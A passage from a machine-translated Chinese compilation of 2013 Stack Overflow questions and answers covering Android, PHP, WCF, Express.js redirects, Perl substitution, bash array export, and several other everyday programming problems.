    else:
        return [node.data] 
```

# php - 需要从我的 android 设备访问 localhost

> ID：15825313
> 
> 赞同：-1
> 
> 时间：2013-04-05T03:15:00.450
> 
> 标签：php, android, mysql

我在以下文件夹中有一个 php 文件：

```
C:\wamp\www\android_test\fetch_data2 
```

我需要能够从我的应用程序访问此文件，但目前无法访问它。这是我的 Java 代码，我将突出显示我需要修复的地方。我可以通过 localhost/android_data 从我的计算机访问 php 文件......，但我无法从我的手机浏览器访问它。此外，我没有在随附的 xml 文件中编写代码，也许这就是我的 php 文件没有显示在应用程序上的原因。

附加说明：我只想让我的应用程序显示这个连接到 mysql 数据库并输出的 php 文件：

```
 [{"name":"User1","received_power":"-75.12207037710479","tower":"4","status":"0"},{"name":"User2","received_power":"18.89454151068304","tower":"3","status":"0"}] 
```

我的名为 MySQLData.java 的 java 文件有以下内容：

```
package com.example.qosmetre2;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.net.ParseException;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;
import java.util.ArrayList; 
import java.util.HashMap; 
import java.util.List; 

import org.apache.http.NameValuePair; 
import org.json.JSONArray; 
import org.json.JSONException; 
import org.json.JSONObject; 

import android.app.ListActivity; 
import android.app.ProgressDialog; 
import android.content.Intent; 
import android.os.AsyncTask; 
import android.os.Bundle; 
import android.util.Log; 
import android.view.View; 
import android.widget.AdapterView; 
import android.widget.AdapterView.OnItemClickListener; 
import android.widget.ListAdapter; 
import android.widget.ListView; 
import android.widget.SimpleAdapter; 
import android.widget.TextView;

public class MySQLData extends ListActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String result = null;
        InputStream is = null;
        StringBuilder sb=null;
        //String result=null;
        ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
        //http post

        try{
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://174.112.97.111/android_test/fetch_data2.php");
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse response = httpclient.execute(httppost);
            HttpEntity entity = response.getEntity();
            is = entity.getContent();
        }catch(Exception e){
            Log.e("log_tag", "Error in http connection"+e.toString());
        }

        //convert response to string

        try{
            BufferedReader reader = new BufferedReader(new InputStreamReader(is,"iso-8859-1"),8);
            sb = new StringBuilder();
            sb.append(reader.readLine() + "\n");
            String line="0";
            while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
            }

            is.close();
            result=sb.toString();

        }catch(Exception e){

            Log.e("log_tag", "Error converting result "+e.toString());
        }
        //paring data

        String nam;
        int rec_pow;
        int tow;
        int stat;

        try{
        JSONArray jArray = new JSONArray(result);
        JSONObject json_data=null;

        for(int i=0;i<jArray.length();i++){
                json_data = jArray.getJSONObject(i);
                nam=json_data.getString("name");
                rec_pow=json_data.getInt("recieved_power");
                tow=json_data.getInt("tower");
                stat=json_data.getInt("status");

        }

        }catch(JSONException e1){
            Toast.makeText(getBaseContext(), "Could not Parse Data", Toast.LENGTH_LONG).show();
        }catch (ParseException e1){
            e1.printStackTrace();

        }

    }

} 
```

还有一个名为 MainActivity.java 的文件，除了默认的东西，里面什么都没有，还有一个叫做 main_activity.xml 的 xml 文件，里面什么都没有。

这是我的 andoidmanifest.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.qosmetre2"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="11"
    android:targetSdkVersion="17" />

<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name="com.example.qosmetre2.MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
     <activity
        android:name=".MySQLData"
        android:label="All the Data" > 
    </activity> 

</application> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:20:59.007

如果两台设备都在同一个网络上，并且您只会在您在家/连接到同一网络时使用此应用程序，那么您可以使用路由器分配给您的计算机的本地 IP 地址，可能类似于`192.168.1.4`

如果您想在远离计算机的 3G/4G 或其他 WiFi 连接上使用此应用程序，则需要编辑路由器端口转发设置，然后使用路由器的 IP 地址连接到它。您还可以注册一个连接到该 IP 地址的免费域名，这样您就不必记住一堆数字。

虽然这不是编码问题......

# android - 在滚动到视图之前让 ListView 加载视图

> ID：15825314
> 
> 赞同：0
> 
> 时间：2013-04-05T03:15:05.260
> 
> 标签：android

我有一个使用自定义 ArrayAdapter 来膨胀视图的 ListView。其中一些视图需要显示图像。为了防止 ListView 在我滚动时打嗝，我让每个需要加载位图的视图都在专用线程上执行此操作，并且只有在位图准备好添加到 ImageView 时才回调 UI 线程。

这很好用，但问题是添加位图的布局将需要扩展以容纳位图，并且瞬时扩展对用户来说看起来很刺耳。

如果有一种方法可以更早地加载位图，在它滚动到视图之前，它很有可能会在它滚动到视图时被加载。所以问题是：

有没有办法扩展 ListView 用来确定何时要求适配器显示另一个视图的区域边界？我假设我可以破解 ListView 源，但如果可能的话想避免这种情况。

或者，如果您有更好的建议，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:38:59.950

使用[injustDecodeBounds](http://developer.android.com/reference/android/graphics/BitmapFactory.Options.html#inJustDecodeBounds)首先在它自己的 ui 线程中加载图像的大小，并相应地设置图像视图的大小，然后开始在线程中加载完整图像

# java - Java Swing 应用程序 - 控制器如何访问 UI？

> ID：15825319
> 
> 赞同：0
> 
> 时间：2013-04-05T03:15:22.530
> 
> 标签：java, swing, model-view-controller, architecture

我即将创建一个桌面应用程序。我决定在摇摆中做。现在我对我将要使用的架构感到困惑。我决定做类似的事情。

`ui-controller-service-dao`

我主要对控制器和 UI 之间的关系感到困惑。我了解控制器执行 ui 需要执行的操作，就像控制器处理 ui 的事件一样，例如单击按钮时。但是对于单击按钮然后禁用某些 ui 的情况，这意味着控制器需要访问 ui 才能进行禁用。现在如何从控制器提供对 ui 的访问？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:17:14.657

控制器将具有指向其各自视图和模型的链接。按钮单击不必通过控制器，因为 UI 本身负责处理此事件。另一方面，如果您要打开一个内部框架并且有多个面板，则应通过控制器显示这些面板。如果说一个面板想要更改另一个面板的值，那么它应该通过该视图所属的相应控制器，而不是直接与视图交互。

# php - PHP preg_replace 错误 wordpress

> ID：15825331
> 
> 赞同：0
> 
> 时间：2013-04-05T03:17:00.523
> 
> 标签：php, preg-replace

我有以下wordpress代码

```
function shortcode_parse_atts($text) {
    $atts = array();
    $pattern = '/(\w+)\s*=\s*"([^"]*)"(?:\s|$)|(\w+)\s*=\s*\'([^\']*)\'(?:\s|$)|(\w+)\s*=\s*([^\s\'"]+)(?:\s|$)|"([^"]*)"(?:\s|$)|(\S+)(?:\s|$)/';
    $text = preg_replace("/[\x{00a0}\x{200b}]+/u", " ", $text);
    if ( preg_match_all($pattern, $text, $match, PREG_SET_ORDER) ) {
        foreach ($match as $m) {
            if (!empty($m[1]))
                $atts[strtolower($m[1])] = stripcslashes($m[2]);
            elseif (!empty($m[3]))
                $atts[strtolower($m[3])] = stripcslashes($m[4]);
            elseif (!empty($m[5]))
                $atts[strtolower($m[5])] = stripcslashes($m[6]);
            elseif (isset($m[7]) and strlen($m[7]))
                $atts[] = stripcslashes($m[7]);
            elseif (isset($m[8]))
                $atts[] = stripcslashes($m[8]);
        }
    } else {
        $atts = ltrim($text);
    }
    return $atts;
} 
```

使用路径执行函数后，出现此错误：

> 警告：preg_replace() [function.preg-replace]：编译失败：在第 258 行的 /PATH/wp-includes/shortcodes.php 中的偏移量 -1 处设置了未知选项位

第 258 行标记在这里

```
$text = preg_replace("/[\x{00a0}\x{200b}]+/u", " ", $text); //<--- LINE 258 
```

任何人都可以提供任何帮助吗？

将不胜感激

无法降级php版本...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:33:40.683

发生这种情况是因为您的 PCRE 已过时。将 PHP 更新到 5.3 版本后，您需要手动更新服务器的 PCRE。

在 SSH 中运行以下代码：

```
pcretest -C 
```

它会显示你运行它的版本。最后一个版本是 8.32。

这是您应该与每个 PHP 版本一起使用的 PCRE 版本的关系：http: [//php.net/manual/en/pcre.installation.php](http://php.net/manual/en/pcre.installation.php)

# javascript - WCF 数据服务没有响应 json，只有 xml

> ID：15825332
> 
> 赞同：0
> 
> 时间：2013-04-05T03:17:01.427
> 
> 标签：javascript, json, ajax, wcf, service

我正在尝试使用 jquery ajax 调用来使用数据服务功能，我尝试了很多调用它的方法，并设置了服务合同和数据服务，但不管它一直给我 XML 是什么。我听有人说我需要使用jsonp，但这真的有必要吗？

```
 [ServiceContract]
 public interface IService1
 {

    [OperationContract]
    [WebInvoke(Method = "POST", BodyStyle = WebMessageBodyStyle.WrappedRequest, ResponseFormat = WebMessageFormat.Json)]
    string GetData(int value);

    [OperationContract]
    CompositeType GetDataUsingDataContract(CompositeType composite);

    // TODO: Add your service operations here
}

// Use a data contract as illustrated in the sample below to add composite types to service operations.
[DataContract]
public class CompositeType
{
    bool boolValue = true;
    string stringValue = "Hello ";

    [DataMember]
    public bool BoolValue
    {
        get { return boolValue; }
        set { boolValue = value; }
    }

    [DataMember]
    public string StringValue
    {
        get { return stringValue; }
        set { stringValue = value; }
    }
} 
```

这是我的数据服务类

```
 public class MyService : DataService<MyEntities>
{
    private readonly MyEntities _dataSource;

    public MyService() : this(new MyEntities()) { }

    // im doing DI since I am testing my service operations with a local DB
    public MyService(MyEntities dataSource)
    {
        _dataSource = dataSource;
    }

    protected override MyEntities CreateDataSource()
    {
        return _dataSource;
    }

    // This method is called only once to initialize service-wide policies.
    public static void InitializeService(DataServiceConfiguration config)
    {
        config.SetEntitySetAccessRule("Teams", EntitySetRights.AllRead);
        config.DataServiceBehavior.MaxProtocolVersion = DataServiceProtocolVersion.V3;
    } 
```

}

这是jquery ajax。它只警告错误，当我在控制台中检查错误时，它是一个 json 解析错误，因为它正在获取 XML。

```
var url = "http://localhost:2884/MyService.svc/Teams";
$.ajax({
    type: "GET",
    url: url,
    contentType: 'application/json; charset=utf-8',
    accept: 'application/json',
    dataType: 'json',
    success: function (msg) {
        alert(msg.d);
    },
    error: function(xhr, ajaxOptions, thrownError) {
                alert("error : " + xhr + ajaxOptions + thrownError);
            }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T17:21:20.243

如果有人在 WCF 数据服务的这一点上卡住了，那么很容易假设您刚刚开始，就像我一样。

我对这个问题的解决方案是从 WCF 转移到 Web API（微软似乎也在做同样的事情）参考： http: [//www.codeproject.com/Articles/341414/WCF-or-ASP-NET- Web-APIs-My-two-cents-on-the-subject](http://www.codeproject.com/Articles/341414/WCF-or-ASP-NET-Web-APIs-My-two-cents-on-the-subjec)

再加上看看事情有多简单，我能够在几分钟内让它工作。

```
public class TeamsController : ApiController
{
    Team[] teams; // defined by whatever persistant means u want. ie. Entity Framework.

    public IEnumerable<Team> GetAllTeams()
    {
        return teams;
    }
} 
```

然后我的JS

```
 $.getJSON("api/teams/",
        function (data) {
            alert(data);
        }); 
```

是的，这好多了：DI 使用了本教程 [http://www.asp.net/web-api/overview/getting-started-with-aspnet-web-api/tutorial-your-first-web-api](http://www.asp.net/web-api/overview/getting-started-with-aspnet-web-api/tutorial-your-first-web-api)

# node.js - 如何在 Express.js 中重新加载当前页面？

> ID：15825333
> 
> 赞同：33
> 
> 时间：2013-04-05T03:17:04.270
> 
> 标签：node.js, express

我在`/id/1234`页面中，然后单击一个`POST /add`按钮，然后我想`/id/1234`在 Experss.js 中重新加载：`res.redirect(**How to get /id/1234 dynamicly, since I will be in /id/1235, /id/1236 page do a same POST /add action?**)`

谢谢。

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2015-07-27T12:03:14.527

我只想在 Express 的 4.x 版本中添加它，您可以使用

```
res.redirect('back'); 
```

自动重定向回请求来自的页面。这是等价的

```
res.redirect(req.get('referer')); 
```

[彼得里昂回答](https://stackoverflow.com/a/15827882/1153203)中提到的

另见：[http ://expressjs.com/api.html#res.redirect](http://expressjs.com/api.html#res.redirect)

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-04-05T07:09:13.660

为了给您可能想要的答案，浏览器将发送一个名为的标头`[Referer][1]`，其中包含页面的 URL `/id/1234`，因此请执行以下操作：

```
res.redirect(req.get('referer')); 
```

但是，如果您需要这样做，您的 URL 路径设计可能很差。更好的选择可能是通过 AJAX 提交表单而不更改 URL 或`1234`在表单正文中包含 id 并使用 POST 请求中的值来为相应的重定向生成正确的 URL。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2016-12-03T06:30:56.663

我用 express 4.x 你可以这样写

```
res.redirect(req.originalUrl) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T03:38:26.947

```
res.redirect("/id/1234") 
```

您只需提供您希望重定向到的路径（或完整 URI）。

如果您的身份在帖子数据中：

```
res.redirect("/id/" + req.body.id); 
```

# javascript - 记录 sub/pub 的好方法是什么？

> ID：15825334
> 
> 赞同：11
> 
> 时间：2013-04-05T03:17:11.753
> 
> 标签：javascript, backbone.js, documentation, marionette

目前我正在玩 Backbone/Marionette（尽管问题更笼统），而且我有很多代码可以在整个应用程序中“发送消息”。举个例子，像这样：

```
 vent.on("search:start", function() {...});
 vent.trigger("search:start"); 
```

但是我没有任何好的方法来追踪（记录）应用程序中哪些消息/调用可用。

所以我的问题是：记录这个（sub/pub）的好方法是什么？

我会假设（虽然我没有找到）可能有一个工具可以让你添加注释（Javadoc 风格），它会从中产生或多或少合理的东西。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-05T18:26:24.093

我的建议是有一个大的signals.eventConstants。这是一个对象，其唯一目的是保存一个字符串列表，这些字符串作为您要发布或订阅的内容放入订阅者或发布者中。

所以而不是做

```
vent.on("search:start", function() {...});
vent.trigger("search:start"); 
```

你会做

```
vent.on(signals.eventConstants.searchStart, function() {...});
vent.trigger(signals.eventConstants.searchStart); 
```

然后，您有一个中心位置，您可以在其中检查所有发布/订阅广播主题，如果您想更改它们的名称，或者稍后添加更多主题，您可以在一个地方进行检查，这样您就不会创建相同的广播。

在 signals.eventConstants 内部，您还可以用注释记录每个信号的用途。

所以你会有类似的东西

```
//This broadcast will fire when a search is started 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T17:37:55.943

也许你可以使用[JS-Signals？](http://millermedeiros.github.com/js-signals/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T17:02:21.083

您可以使用 YUI 文档[http://yui.github.com/yuidoc/](http://yui.github.com/yuidoc/)和 JS 文档[https://code.google.com/p/jsdoc-toolkit/](https://code.google.com/p/jsdoc-toolkit/)。查看文档以了解适合您需求的内容。

# jquery - 使用jquery在浏览器区域内继续移动div

> ID：15825335
> 
> 赞同：0
> 
> 时间：2013-04-05T03:17:13.160
> 
> 标签：jquery

我的网页上有一个移动的 div，它使用具有 pagex 和 pagey 以及 jquery 动画功能的鼠标悬停，然后更改顶部和左侧的值。当它移动时，它将超过浏览器大小并开始滚动。如何将其保留在浏览器的范围内而不滚动？

# php - 银条 - 谷歌连接

> ID：15825338
> 
> 赞同：0
> 
> 时间：2013-04-05T03:17:41.990
> 
> 标签：php, content-management-system, openid, silverstripe

我试图让 google connect/openid 在 silverstripe 中工作，但我收到了这个错误，我根本不明白它的错误。

```
[Notice] Trying to get property of non-object
GET /GoogleCallback/GoogleConnect

$ch = curl_init($url);
curl_setopt_array($ch, array(
            CURLOPT_RETURNTRANSFER => true,         
CURLOPT_HTTPHEADER => array( 'Accept: application/xrds+xml')
        ));

    $xml = curl_exec($ch);      
    $xml = simplexml_load_string($xml);
    $discovery = $xml->XRD->Service->URI->__toString();

    curl_close($ch);

    $params = array(
        'openid.mode' => 'checkid_setup',
        'openid.ns' => 'http://specs.openid.net/auth/2.0', 
```

PS：我正在使用这个模块[https://github.com/MediaDevils/silverstripe-google-authentication](https://github.com/MediaDevils/silverstripe-google-authentication)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:42:39.433

这将有助于告诉我们哪一行确切触发了该错误，但我想它会在

```
$discovery = $xml->XRD->Service->URI->__toString(); 
```

您很可能没有收到预期的 XML 响应（可能有多种原因，因此模块本身可能不是问题的根本原因）。例如，您可以转储 $xml 变量的内容，以便更多地了解您返回的内容。就像是

```
Debug::Dump($xml);
Debug::Dump(curl_error($ch)); 
```

在 curl_exec($ch) 之后；

希望这可以帮助

# html - 将背景图像应用于图像元素

> ID：15825340
> 
> 赞同：0
> 
> 时间：2013-04-05T03:18:00.267
> 
> 标签：html, css, image, background-image, ihtmlimgelement

我在将一些背景图像应用于图像元素时遇到了一些麻烦。有谁知道这是否可能？

我想要做的是拥有这个画廊，其中下一个和上一个按钮根据图像的大小改变位置，所以我计划只在一个应用于显示图像的类中设置下一个和上一个按钮。

这是画廊：[http ://reveriesrefined.com/myftp/stack_1/](http://reveriesrefined.com/myftp/stack_1/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:49:12.657

图像元素将调整自身大小以适应图像的大小。即使将 background-image 应用于 img 元素是有效的 CSS，它也总是会被掩盖。更不用说你不能点击背景图片。

更好的解决方案是将按钮编写为 HTML。您可以使用 CSS 将按钮移动到最左侧和最右侧，或者如果您想将它们垂直放置在顶部和底部。

```
<style>
    .image_cont { position: relative; display: inline-block }
     /* left and right styling */
    .image_next_btn { position: absolute; left: 0; top: 50%; margin-top: -10px; }
    .image_prev_btn { position: absolute; right: 0; top: 50%; margin-top: -10px; }
     /* or top and bottom styling */
    .image_next_btn { position: absolute; left: 50%; top: 0; margin-left: -10px; }
    .image_prev_btn { position: absolute; left: 50%; bottom: 0; margin-left: -10px; }
</style>

<div class="image_cont">
    <img src="images/Ania_02.jpg">
    <div class="image_prev_btn">prev</div>
    <div class="image_next_btn">next</div>
</div> 
```

# perl - 如何获取 perl (s//) 的替换文本？

> ID：15825349
> 
> 赞同：1
> 
> 时间：2013-04-05T03:18:57.980
> 
> 标签：perl, substitution

我使用以下代码进行替换。有没有办法检索替换的文本？在这个例子中，我想得到字符串`_5p_outsuffix.txt`。

```
/tmp$ ./main.pl 
xxx_5p_outsuffix.txt
/tmp$ cat main.pl 
#!/usr/bin/env perl

use strict;
use warnings;

my $filename="xxx_5p_insuffix.txt";
my $insuffix="_((5|3)p)_insuffix\.txt";
my $outsuffix = '_$1_outsuffix.txt';

$filename =~ s/$insuffix$/qq{"$outsuffix"}/ee;
print "$filename\n"; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T03:29:22.457

您应该*捕获*匹配字符串：

```
$filename =~ s/($insuffix)$/qq{"$outsuffix"}/ee;
print "$filename\n";
print "Substituted: $1\n"; 
```

由于这引入了额外级别的大括号​​，因此您必须调整替换字符串中使用的任何捕获的数量。或者，您可以使用修饰符`${^MATCH}`包含与上一个成功的正则表达式匹配的字符串的内置变量。`/p`这看起来像

```
$filename =~ s/$insuffix$/qq{"$outsuffix"}/eep;
print "$filename\n";
print "Substituted: ${^MATCH}\n"; 
```

（您*不应*将`$&`其用于此目的，因为它会使程序中的所有正则表达式显着变慢。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:27:58.670

[检查perldoc.perl.org/perlvar.html](http://perldoc.perl.org/perlvar.html)中关于与正则表达式相关的变量的部分，特别是变量`$&`

# button - 如何创建一个循环遍历所有行变量的按钮，一次可见一个？

> ID：15825350
> 
> 赞同：0
> 
> 时间：2013-04-05T03:19:16.347
> 
> 标签：button, kineticjs

如何创建一个循环遍历所有行变量的按钮，一次可见一个？

我正在使用 Kinetic Javascript，我想制作一个循环遍历所有行变量的按钮，每次单击该按钮时，它都会将下一行的可见性变为“真”，将前几行的可见性变为“假”

到目前为止，这是我的代码：http: [//jsfiddle.net/NXt2L/4/](http://jsfiddle.net/NXt2L/4/)

```
 <body>
  <div id="container"></div>
    <div id="buttons">
      <button id="show">
        show
      </button>
      <button id="hide">
        hide
      </button>
      <button id="reroute">
        reroute
      </button>
    </div>
    <div id="container"></div>
    <script src="kineticjs.js"></script>
    <script>
      var stage = new Kinetic.Stage({
        container: 'container',
        width: 1700,
        height: 1100
      });

    //Creates our layer to be put over the stage
    //note that we could have the building map as a layer itself and simply--
    //--put these muiltiple layers ontop of each other.
      var layer = new Kinetic.Layer();

      <!--Room 202-->
      var line202n = new Kinetic.Shape({
        drawFunc: function(canvas) {
          var context = canvas.getContext();
          context.beginPath();
          context.moveTo(454, 338);
          context.lineTo(440, 351);
          context.lineTo(533, 449);
          context.lineTo(565, 449);
          context.lineTo(635, 449);
          context.lineTo(635, 368);
          context.lineTo(591, 368);
          context.lineTo(591, 289);
          canvas.fillStroke(this);
        },
        stroke: 'blue',
        strokeWidth: 6,
        visible: false
      });
      layer.add(line202n);

      var line202s = new Kinetic.Shape({
        drawFunc: function(canvas) {
          var context = canvas.getContext();
          context.beginPath();
          context.moveTo(454, 338);
          context.lineTo(440, 351);
          context.lineTo(533, 449);
          context.lineTo(565, 449);
          context.lineTo(635, 449);
          context.lineTo(1432, 449);
          context.lineTo(1432, 532);
          canvas.fillStroke(this);
        },
        stroke: 'blue',
        strokeWidth: 6,
        visible: false
      });
      layer.add(line202s);

      //add the layer to the stage
      stage.add(layer);

      // add button event bindings
        document.getElementById('show').addEventListener('click', 
        function() {
          line202n.show();
          layer.draw();
        }, false);

        document.getElementById('hide').addEventListener('click', function() {
          line202n.hide();
          layer.draw();
        }, false);

        document.getElementById('reroute').addEventListener('click', function() {
          line202n.hide();
          layer.draw();
        }, false);

      </script>
  </body> 
```

# javascript - 如何检查浏览器的文本区域是否可调整大小？

> ID：15825352
> 
> 赞同：2
> 
> 时间：2013-04-05T03:19:26.737
> 
> 标签：javascript, jquery, css

如果浏览器不使 textareas 可调整大小，我将附加自定义调整大小句柄：我如何检查是否是这种情况？（不诉诸特定浏览器的测试）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T03:20:22.927

玩了一会儿之后，这似乎可行：

```
if($(textarea).css('resize') != 'both'){
    // add custom resize handle
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:43:43.490

您可能需要考虑在所有浏览器中添加自定义调整大小句柄。这样做的好处是您的网站在所有浏览器中看起来都相同（或几乎相同）。该站点使用`resize:none;`css 执行此操作。

# bash - Bash 数组导出？

> ID：15825353
> 
> 赞同：10
> 
> 时间：2013-04-05T03:19:28.997
> 
> 标签：bash, bash, bash

**是否可以从函数**中的单个语句声明和导出[bash](/questions/tagged/bash "显示标记为“bash”的问题")数组？

 **我目前的解决方法是先声明，然后再导出。

```
f() { foo=(1 2 3); export foo; }; f; export -p | grep foo=
declare -ax foo='([0]="1" [1]="2" [2]="3")' 
```

我观察到：

```
f() { export bar=(1 2 3); }; f; export -p | grep bar=
<no output> 
```

和：

```
f() { export baz="(1 2 3)"; }; f; export -p | grep baz=
declare -x baz="(1 2 3)" # not an array 
```

我使用[bash](/questions/tagged/bash "显示标记为“bash”的问题") v3.2.48(1)-release 并且无法升级。

* * *

一些背景：

我有一个朋友，我想和他一起学习“一些”Django。

他在命令行上比我更无能，在 OSX hackintosh 上需要以下内容：

*   启动交互式外壳
*   根据我的规范，找到包括 django bin 目录的 PATH 变量
*   找到一个更新的 PYTHONPATH env var，各种 django 库可见
*   一个不错的交互式 ipython shell，双击后开始输入命令
*   （棘手的）一旦他 CTRL-D 从 ipython 退出时回退到一个交互式 shell

在 Windows 上，我会为命令快捷方式（如 cmd.exe）设置别名，设置自定义环境变量并启动 ipython。这有效：退出 ipython 后，仍然会发现自己处于命令解释器中。

这对 OSX 的标准 bash 有可能吗？我玩过 bash -c 但很多事情都不起作用，比如切换到目录，能够退出 python 并*留*在终端等。也玩过 -s。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-06T20:00:38.450

您不能在 Bash（或任何其他 shell）中导出数组。Bash*永远不会*将数组导出到环境中（直到有一天可能实现，请参阅`bugs`手册页中的部分）。

这里发生了几件事。同样，`-x`在数组上设置属性是无意义的，因为它实际上不会被导出。您看到这些结果的*唯一*原因是您在本地化之前定义了数组，导致它下降到该名称已成为本地（或全局范围）的下一个最外层范围。

所以要明确一点，每当您使用声明命令时，您总是在创建一个局部变量，除非您使用`export`或`readonly`使用非数组赋值作为参数，因为这些是 POSIX，它没有指定局部变量或数组。

```
function f {
    typeset -a a # "a" is now local to "f"
    g
    printf 'Now back in "f": %s\n' "$(typeset -p a)"
}

function g {
    a=(1 2 3)                               # Assigning f's localized "a"
    typeset -a a                            # A new local a
    printf 'In "g": %s\n' "$(typeset -p a)" # g's local is now empty.
    a=(a b c)                               # Now set g's local to a new value.
    printf 'Still in "g": %s\n' "$(typeset -p a)"
}

f

# In "g": declare -a a='()'
# Still in "g": declare -a a='([0]="a" [1]="b" [2]="c")'
# Now back in "f": declare -a a='([0]="1" [1]="2" [2]="3")' 
```

似乎如果你给一个数组作为参数，`export`那么 Bash 就会像任何其他声明命令一样使它成为本地的。基本上不`export`用于定义数组。`export`是一个 POSIX 内置函数，它的行为对于数组是未定义的，这可能就是为什么 bash 只是把它当作你使用过`typeset -ax a=(1 2 3)`. 使用`typeset`、`local`或`declare`。真的没有办法知道什么是“正确的”，甚至无法与其他 shell 进行比较。ksh93 是唯一一个接受数组赋值作为声明命令的参数的另一个，它的行为与 Bash 不一致。

要理解的重要一点是环境与它无关，当您尝试使用仅限 POSIX 的命令执行非标准操作时，您只是在玩弄当地人的怪癖。

为了真正得到你想要的效果，你可以使用`typeset -p`.

```
function f {
    typeset -a "${1}=(1 2 3)"
    typeset -p "$1"
}

typeset -a arr
eval "$(f arr)"
typeset -p arr 
```

Bash 保证你会得到正确的结果，但我发现这不是很有用并且很少使用这种方法。通常最好让调用者定义一个本地并使用动态范围来完成工作（正如您已经发现的那样......只需在不导出的情况下进行）。

在 Bash 4.3 中，您可以使用`typeset -n`，这确实是处理此问题的最正确方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-05T04:46:11.130

第一个选项似乎是唯一可行的选项。我尝试了`bash`4.2 和 3.2.48。对我来说，有趣的信息是您的示例的这些次要变体：

```
$ f() { declare -a bar=(1 2 3); export bar; export -p | grep bar=; }; f; export -p | grep bar=
declare -ax bar='([0]="1" [1]="2" [2]="3")'
$ f() { export  bar=(1 2 3); export -p | grep bar=; }; f; export -p | grep bar=
declare -ax bar='([0]="1" [1]="2" [2]="3")'
$ f() { bar=(1 2 3); export bar; export -p | grep bar=; }; f; export -p | grep bar=
declare -ax bar='([0]="1" [1]="2" [2]="3")'
declare -ax bar='([0]="1" [1]="2" [2]="3")'
$ unset bar
$ f() { bar=(1 2 3); }; f; set | grep bar=
bar=([0]="1" [1]="2" [2]="3")
    bar=(1 2 3)
$ 
```

在这些示例中，我测试了`export`函数内部以及函数外部。因为变量是在函数中定义的，所以它们似乎仅限于函数的范围。例外情况是在应用任何属性之前定义变量 - 最后两个函数。创建一个全局变量，然后导出（在一种情况下）。

因此，如果您要从函数中导出数组，则必须在不使用`declare`or`export`语句的情况下创建它（因为这些语句使变量成为函数的本地变量），然后将其导出。

我希望能解释它；我可以模糊地看到发生了什么，这是有道理的，在时尚之后。我不确定我是否解释了它以及应该解释它。

* * *

在手册的[`declare`](http://www.gnu.org/software/bash/manual/bash.html#Bash-Builtins)部分中`bash`，它说：

> 在函数中使用时，`declare`使每个名称都成为本地名称，与`local`命令一样。

中没有等效的措辞[`export`](http://www.gnu.org/software/bash/manual/bash.html#Bourne-Shell-Builtins)。但是，观察到的行为*好像* `export`是由 实现的`declare -x`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-10-16T11:15:52.347

如果我想导出数组 MY_ARRAY，我使用：

```
[[ $MY_ARRAY ]] && export A_MY_ARRAY=$(declare -p MY_ARRAY) 
```

在呼叫方和

```
[[ $A_MY_ARRAY =~ ^declare ]] && eval $A_MY_ARRAY 
```

在子脚本。**

# ios - 创建复杂 UIView 的更快方法？

> ID：15825354
> 
> 赞同：1
> 
> 时间：2013-04-05T03:19:41.357
> 
> 标签：ios, uiview

我有一个复杂的视图，比方说`ComplexView`，它由 10 个标签、2 个按钮、2 个大图像组成，我需要多次创建它（滚动、快速滚动！）——文本和图像在任何两个不同的`ComplexView`视图中都是不同的。

目前我正在以`ComplexView`编程方式创建每个实例。

1）不知道有没有什么技巧可以加快每次创建uiview的过程？

2）我看到我可以试验的唯一选择：为这个特定视图创建一个 xib 文件并在那里提取我的视图的通用部分 - 我会从中受益吗？

更新：类似的问题，详细解释了 Seamus Campbell 在接受的答案中所说的内容：[如何重用/回收像 uitableviewcell 这样的自定义元素？](https://stackoverflow.com/questions/4914427/how-to-reuse-recycle-custom-custom-element-like-uitableviewcell-does?rq=1)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:42:46.093

